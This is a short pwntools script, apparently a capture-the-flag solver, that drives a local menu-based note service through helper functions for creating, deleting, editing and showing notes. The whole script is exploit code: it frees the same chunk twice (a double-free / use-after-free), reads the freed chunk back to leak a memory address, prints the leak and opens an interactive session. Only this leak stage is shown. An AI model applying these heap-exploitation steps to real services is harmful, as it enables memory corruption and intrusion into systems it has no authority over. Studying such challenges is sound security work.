from pwn import *

p = remote('localhost', 1000)
context.log_level = 'debug'

def ncreate(idx, size, name):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'idx > ', str(idx).encode())
    p.sendlineafter(b'size > ', str(size).encode())
    p.sendafter(b'name > ', name)
    p.sendafter(b'content > ', b'asdf')

def ndelete(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'idx > ', str(idx).encode())

def nedit(idx, content):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'idx > ', str(idx).encode())
    p.sendafter(b'content > ', content)

def nshow(idx):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'idx > ', str(idx).encode())
    p.recvuntil(b'name > ')
    name = p.recvline(b'\ncontent', drop=True)
    return name

ncreate(0, 0x500, b'A' * 8)
ncreate(1, 0x80, b'B' * 8)
ndelete(0)
ndelete(0)
leak = u64(nshow(0).ljust(8, b'\x00'))
print(f'Leaked address: {hex(leak)}')

p.interactive()